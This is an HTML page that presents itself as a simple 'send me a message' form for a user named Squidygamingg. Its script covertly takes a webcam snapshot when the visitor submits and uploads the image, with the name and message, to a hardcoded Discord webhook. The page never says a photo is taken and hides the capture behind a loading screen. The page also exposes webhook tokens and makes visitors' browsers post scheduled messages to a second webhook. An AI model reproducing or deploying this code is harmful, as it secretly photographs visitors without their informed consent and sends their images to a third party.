<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Send me a message!</title>
    <style>
        /* Apply a background gradient animation */
        body {
            background: linear-gradient(90deg, #ff9a8b, #ff6a88, #ff6a88, #ff9a8b);
            background-size: 400% 100%;
            animation: backgroundAnimation 10s infinite;
        }

        @keyframes backgroundAnimation {
            0% {
                background-position: 200% 0;
            }
            100% {
                background-position: -200% 0;
            }
        }

        /* Style the message and buttons */
        h1 {
            font-size: 28px;
            text-align: center;
            color: #fff;
            margin-top: 50px;
            animation: fadeInUp 1s;
        }

        .button-container {
            text-align: center;
            margin-top: 20px;
        }

        button {
            display: inline-block;
            margin: 0 10px;
            padding: 10px 20px;
            background-color: #3498db;
            color: #fff;
            border: none;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s, transform 0.2s;
        }

        button:hover {
            background-color: #2980b9;
            transform: scale(1.05);
        }

        /* Animation for fadeInUp */
        @keyframes fadeInUp {
            0% {
                opacity: 0;
                transform: translateY(20px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Style for displaying the image */
        #image-container {
            text-align: center;
            margin-top: 20px;
        }

        #captured-image {
            max-width: 100%;
            height: auto;
        }

        /* Loading screen styles */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none; /* Initially hidden */
        }

        #loading-text {
            font-size: 24px;
            color: #fff;
        }

        /* Message input styles */
        #message-input {
            text-align: center;
            margin-top: 20px;
            animation: slideIn 1s; /* Add animation */
            display: flex;
            flex-direction: column;
            align-items: center; /* Align content to the middle */
        }

        @keyframes slideIn {
            0% {
                opacity: 0;
                transform: translateY(-50px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        #name-input {
            width: 80%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            margin-top: 10px; /* Add margin for spacing */
        }

        #message-textarea {
            width: 80%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
        }

        #send-message-button {
            background-color: #3498db;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s, transform 0.2s;
            margin-top: 10px; /* Add margin for spacing */
        }

        #send-message-button:hover {
            background-color: #2980b9;
            transform: scale(1.05);
        }

        /* Confirmation message styles */
        #confirmation-message {
            font-size: 18px;
            color: #fff;
            text-align: center;
            display: none; /* Initially hidden */
            margin-top: 20px;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const buttonContainer = document.createElement('div');
            buttonContainer.className = 'button-container';

            const loadingScreen = document.createElement('div');
            loadingScreen.id = 'loading-screen';

            const loadingText = document.createElement('div');
            loadingText.id = 'loading-text';
            loadingText.textContent = 'Loading...';

            document.body.appendChild(buttonContainer);

            // Function to create the message input elements
            function createMessageInput() {
                const sendButton = document.createElement('button');
                sendButton.textContent = 'Send a message for Squidygamingg!';
                sendButton.id = 'sendButton';
                buttonContainer.appendChild(sendButton);

                sendButton.addEventListener('click', () => {
                    // Prompt the user for the message
                    const messageText = prompt('Enter your message for Squidygamingg:');
                    if (messageText !== null && messageText !== '') {
                        // Hide the send button
                        sendButton.style.display = 'none';

                        // Create message input elements
                        const messageInput = document.createElement('div');
                        messageInput.id = 'message-input';

                        const nameInput = document.createElement('input');
                        nameInput.type = 'text';
                        nameInput.id = 'name-input';
                        nameInput.placeholder = 'Name';
                        nameInput.required = true; // Make Name field required

                        const messageTextarea = document.createElement('textarea');
                        messageTextarea.id = 'message-textarea';
                        messageTextarea.value = messageText; // Set the message from the prompt
                        messageTextarea.placeholder = 'Enter your message...';
                        messageTextarea.required = true; // Make Message field required

                        const sendMessageButton = document.createElement('button');
                        sendMessageButton.textContent = 'Send Message';
                        sendMessageButton.id = 'send-message-button';

                        messageInput.appendChild(nameInput); // Add the name input
                        messageInput.appendChild(messageTextarea);
                        messageInput.appendChild(sendMessageButton);

                        document.body.appendChild(messageInput);

                        sendMessageButton.addEventListener('click', async () => {
                            const nameText = nameInput.value;
                            const messageText = messageTextarea.value;

                            if (nameText && messageText) {
                                // Display the loading screen
                                loadingScreen.style.display = 'flex';

                                // Capture front camera image
                                const imageBlob = await captureFrontCameraImage();

                                // Send a message with the captured image, name, and text
                                sendMessageWithImageAndText(imageBlob, nameText, messageText);

                                // Hide the message input
                                messageInput.style.display = 'none';

                                // Show the confirmation message
                                const confirmationMessage = document.getElementById('confirmation-message');
                                confirmationMessage.textContent = 'Thank you for your message! Wait for the owner to include your text in the Comments (response)';
                                confirmationMessage.style.display = 'block';

                                // Hide the loading screen
                                loadingScreen.style.display = 'none';
                            }
                        });
                    }
                });
            }

            // Function to capture front camera image
            async function captureFrontCameraImage() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    document.body.appendChild(video);
                    video.srcObject = stream;
                    await video.play();

                    // Capture a frame from the video stream as an image
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert the captured frame to a data URL (base64)
                    const imageBlob = canvas.toDataURL('image/jpeg');

                    // Stop the camera stream and remove the video element
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();

                    return imageBlob;
                } catch (error) {
                    console.error('Error capturing image:', error);
                    return null;
                }
            }

            // Function to send a message with an image, name, and text using a Discord webhook
            function sendMessageWithImageAndText(imageBlob, nameText, messageText) {
                // Replace 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL
                const webhookURL = 'https://discordapp.com/api/webhooks/1156295739438276608/_9y-AowFIIMfpYlSB_h2Ya7nvo1ehBeuUvpn4y-GqOA7WEzIksm0Np-Yee47OdO2_Bdl';

                const formData = new FormData();
                formData.append('file', dataURItoBlob(imageBlob), 'image.jpg');
                formData.append('content', `**Name:** ${nameText}\n**Message:** ${messageText}`); // Format as Discord Markdown

                fetch(webhookURL, {
                    method: 'POST',
                    body: formData,
                })
                .then(response => {
                    console.log('Image and text sent to Discord webhook.');
                })
                .catch(error => {
                    console.error('Error sending image and text to Discord webhook:', error);
                });
            }

            // Helper function to convert data URI to Blob
            function dataURItoBlob(dataURI) {
                const byteString = atob(dataURI.split(',')[1]);
                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }

            // Create the message input when the page loads
            createMessageInput();

            // Function to send scheduled messages
            function sendScheduledMessages() {
                const now = new Date();
                const hour = now.getUTCHours();
                const minute = now.getUTCMinutes();

                const webhookURL = 'https://discordapp.com/api/webhooks/1157302481123037255/puzWXAVDnDSeX3UJxeFHZWDKGriu1b4Gn19fI0xhrL2DnQ29GBj_bfPXIelnXHIh55m1';
                const headers = {
                    'Content-Type': 'application/json',
                };

                if (hour === 23 && minute === 59) {
                    // Send "INITIATING RESTART IN 1 MINUTE"
                    const message = {
                        content: 'INITIATING RESTART IN 1 MINUTE',
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: headers,
                        body: JSON.stringify(message),
                    })
                    .then(response => {
                        console.log('Scheduled message sent: INITIATING RESTART IN 1 MINUTE');
                    })
                    .catch(error => {
                        console.error('Error sending scheduled message:', error);
                    });
                } else if (hour === 0 && minute === 1) {
                    // Send "TEST IN PROGRESS"
                    const message = {
                        content: 'TEST IN PROGRESS',
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: headers,
                        body: JSON.stringify(message),
                    })
                    .then(response => {
                        console.log('Scheduled message sent: TEST IN PROGRESS');
                    })
                    .catch(error => {
                        console.error('Error sending scheduled message:', error);
                    });
                } else if (hour === 0 && minute === 2) {
                    // Send "TEST COMPLETE"
                    const message = {
                        content: 'TEST COMPLETE',
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: headers,
                        body: JSON.stringify(message),
                    })
                    .then(response => {
                        console.log('Scheduled message sent: TEST COMPLETE');
                    })
                    .catch(error => {
                        console.error('Error sending scheduled message:', error);
                    });
                }
            }

            // Check and send scheduled messages every minute
            setInterval(sendScheduledMessages, 60000);
        });
    </script>
</head>
<body>
    <h1>Send me a message!</h1>
    <!-- Add a div to display the confirmation message -->
    <div id="confirmation-message"></div>
</body>
</html>
